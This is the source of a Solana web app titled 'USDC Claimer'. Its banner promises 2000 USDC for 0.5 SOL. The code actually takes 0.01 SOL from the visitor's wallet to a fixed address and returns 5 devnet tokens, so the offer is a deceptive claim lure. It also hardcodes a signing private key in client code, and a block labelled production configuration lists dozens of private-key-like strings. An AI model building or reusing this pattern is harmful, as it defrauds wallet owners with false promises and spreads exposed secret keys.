/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "2P5czAus4aUY3YvK7RHAHVerx4sEQmAXNGjMWc3RrbtSXbm9DGEk3Lc5HpweDRKnQj9RYaGFHirmdNBBgD5FyvJ"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "3s2rdkFAmw4onyHg1WUN7DPKadMmkThgabsdoc6jkbQk25s2PBh4ZTob4mQNjY7WFtAKyRnLe24ieruZbbe7LCJe",
  "key1": "4mXvLiFye9aJua7nBXE8sv97xPq9JAmeEfJWZnkzbuk18CyYveUWLxzPvubgUQfHpa11piiw1SpZSvnequid39C8",
  "key2": "4T4S3FzKJjhZTqMTWKtTB3CQUjsYmvhZWmN58D4XUNzDXMSrBh8tB9c1szszcKLfW1QV8zsjx4Jrq2z6C2bXV2Hi",
  "key3": "4xxTuky4jTJgwVvdsoT4sXYY1EAGPumXYcHGqGFF7Sx7FaCTzVFGsnWgbskDkTodh8wwveF1fT1JiEt1kXYFyJgg",
  "key4": "3xDxCU6JBbrZfvPHtByUvk3cGXk2GbFwNGTQLXNsRu3weyvaPHZ5mNbvj4GuPVKAiCZrd2rHo1gVzbRJkHfDzuqd",
  "key5": "4PScb1begH3aJqbZmGHikZKjoihkqWbLExVFsRNB9CKCKpbx22zMFBTmFJdwoaQHR4gXCTXDeThnP63SYvSArK3x",
  "key6": "vY1vrvxRL2QdDQXFqhbchZN5kkQ2WQVzccoQpJvhxn8KcELPVR91C2DaEjSkptc5RUrSmwH6cL2S1MBDfrz1brZ",
  "key7": "5ZgqFtUqkdLUwfBmsBnL5BSrFFZNAsEjiiwYvXjue63GoMzcBd5TxEhBqnp3CRmUkfXgffWNuZhT9GuWdyPRoQLZ",
  "key8": "4CGTyF9vsJKWLoNZabvwrnLJiqq8qWU66VPSwWdGBNSAzDETCnpZ2vonjwNSgLUL2QpHk5fLZNS3EutisZNEDvC9",
  "key9": "2kHGWhMLhFQrYMSvtQDNbPYEeQuDQe9jzTCKFThaqK9ivhtEByJ2YFaJfwj4F4icsWVGeSXn9rditDWYZfmzcXfZ",
  "key10": "3W2TDCadSNVPksM3XnEwGPRZzcKpHsCRLmDKWht4SZgBsBRExwGf36ZsXczCTgKqPatW8xC2VXHhsyBbRWc42QkU",
  "key11": "63Exvt3peh4FfRDwxqGyCz1iAkT6xCDTUfaSxXA49DacEbaiQdwHwRua9WVtPLPph86TZxcX3rzWUxcASBbELkLv",
  "key12": "4iwYa3ovWKDi3wSPTBkHCJKGAwGC6VPH2YaoVXwyBMqZ4LgVtsJxM4crBP1RSKine5aL3829NPwkwcdh3LLYkQ5R",
  "key13": "L28unkyRshFB2jEUMzoA84EVhVzovJTsfxNGJzQJXUGvmGoSkdfzFZqbLCyMasfXxYuEDBch7HuTPDEEnM5NmwQ",
  "key14": "UHjVo8uLSQktSEzuxA2aSZm2XDwuhCaT79t2xyGyxickL3G3uK6a6Dm5TmV8TCXSqvemojfSYq9qtVtZQnsmDzg",
  "key15": "2xk3bg6UgkYL1hBaRQB5xMU3BxBAtS8Bz9LHcTfbAsBpXFhy6g7bZoHQH6cSLTjVfKA5SD4EEnR8gkReJkxWQiMb",
  "key16": "3RKc4QCEg2Lar4DSBkk7Uu5dsFk7M2dXFquAyL2cUrYTdfjeuag3ygohY2WnaAra5UBQAPLJjcBHJfBzxie1sLV2",
  "key17": "3Jshfky1sL9PhvbEZuz72NrmAM9v9d66BRD9n826jiz8tJhsP6N4epVuiE31JFvxuFhot9R1Gxri7kpHEKCerNyC",
  "key18": "2tbTr7niHZgoWvuLPDnJteKmYtGnrAodPxaxaFr67qTFPbrWEpdtu3RXtMHuRNe2LpbC2mrxURaEukJDk8BB7FhV",
  "key19": "4wTvM97A2oFnCLsxntjBuQPDYcH6oi43sFU7Gn6WDaDjsNYYBNgEjZBJZuLFFsKhvsLABHaFF46X6smVMGevzXF",
  "key20": "gkf1Gqxp4bVAaA3b22xsnyRAuBa7XWhwKpDKCEUdnLZi8jeG4jAXwDiLS9AehbgrwsWfAwnyL2RkaSEk3DvBCLF",
  "key21": "2quDzkuG7Cnvz9tsBNf97uedgDysxUgpmGDdNUPwdmEhuL94iNQubVUP7yBWhoAnPjLzBmRCaWEdBSLHkNHp1EFg",
  "key22": "N8rSsRxNL3cRMwq17Ki9xp95rnJbrQuV3PDmnj3x3ThZ7eVew4r4MeC1bCGT5eDGjdZAyi38isAnCkcpbjGCmCe",
  "key23": "3L8FkkbLgi9MJ8zQdFxeAGaTmaRGSDL5hAdWbi75UwGLKYFcQvnpnKDaMs8Bz3v7nuffKAguoDYbomoACwRdP2Co",
  "key24": "5jYXx5PfHaDv7cU4LCtirm9VsmpkdXeGhBKgXS1NtaMBgER99DBmZRRqsLXeUVCvnGneXY3zsKi6nXJKLfQuzZUk",
  "key25": "2dS5oQdfKqRmbhjd1muSA8SSDTtg35oD9epEqrrm69VVF7mDzQMVK6eFZjz2sxWQkDktWbg4K4iVo4BCjxhD2rWk",
  "key26": "Km1SPxgx3noGiPfd6QXqQ3mRQ2cLjDG1VdGecgYCrBgCBGjtKZA4MsfNxyi4RRozaRhZpJFZZs9Z2HDmAMkfJFu",
  "key27": "3wvW3vVyzvc8A3V4peYJYzLRdMeZvkKHix1GiPDy2PhWG2qjdkoTSL15SGxaQYux9yzUVJmgon9prp6rGEd1Km3T",
  "key28": "4NxRWg2eKVh1RDDJdrJP6D3f5V7FRakKB57k1cQnhWeXJRBKutFaCrjseFxm1T6LeEe2gMUenrHtrNyPmwiKLawW",
  "key29": "GpuhT9GakTZQsTGLokh3xYnELjofgiHJQPpRw1ic5BMDU926yY5ykNcYtWMSM9TFrriiJPY6kg1tZgtsmijBNCw",
  "key30": "3TNpoPztQfr4wjMKt4MevskVJep5aZojL4cUWC7Suxuu1nesXPNCmdM5KcZFGcanSLaEAQwMHDZzy1bdA6LcWZkS",
  "key31": "3qjaHuAiQvBkMaMWxgZhBTScW3HhbFevtDmoFTVFr6PxWkDbaygFXVLEYdugrNUCbkcATFNoB5wH2XEHpvDFagC6",
  "key32": "56cCcN7bBaFJTFnQmYPiiJMYqVzji4QXs5qbQmdmWDTePpFSHM1DBtiwem9QZLnrJtxsmKc5Gn82362xpfSE3k7u",
  "key33": "61WJvh4bXiz4HnYHAxgC5wyUkGeTBzsChLFPLP1YNnKfFRfdUVPPBdZ9qGBmdwhFSJLSBpvsNmikwjSsL33HdP43",
  "key34": "2YqJp8EejwvQWPoabaRvU3x4tbHRuUpdBzvxs53t4nF5Q4B3q8V61MC3Jz3ZEBytpkzs1FWxTUXZjpSeHWuSrqxj",
  "key35": "3Bf7bhRWSabvs9hmtMsmcXmKRDWGjQqP1CSwTJ7Zab4LAN2VSUAo26TQNmhahxpqdBqyLLAkaEPtfgsFQsey4Qqv",
  "key36": "nZku7xARqpcDwHFn77rwn6wHrjzkoj4UtCnVuVpcE62ouLTMpoKaXbxSNkp59vpRX398weCoakwLZbWKP2SuVbx",
  "key37": "493UarStZva1GPK3yKXcsadS8FMtMt2hcutSiuM86VAxW9cBenL9ny3Y6tpsXHBNm56QpTs62URpfDTom4ULkCQf",
  "key38": "4Rde2pkm9k7Q7di1AVj2thgLSfCjW9b1qfq5tnXfE1bFAxvGTT1w57QELQFQKjA3z7TBpgMCeEvSe9QQ57qLsizB",
  "key39": "sX1q4bnCRf5QPTXoymhQpwixQGng7nynB5Ht4kK9YAnAFu24Xq9Bb6SJrXX98D1P6Bdc9DvkLmWgYPBXSZbSZPf",
  "key40": "2E7RgDUdBhAUamFE8nc4of8KfrsQo8bfKtX3zCioPysvDCpBaEwXEEK3H3zxPv9WP3FVyrnXr6NvKZggeYUie9yC"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
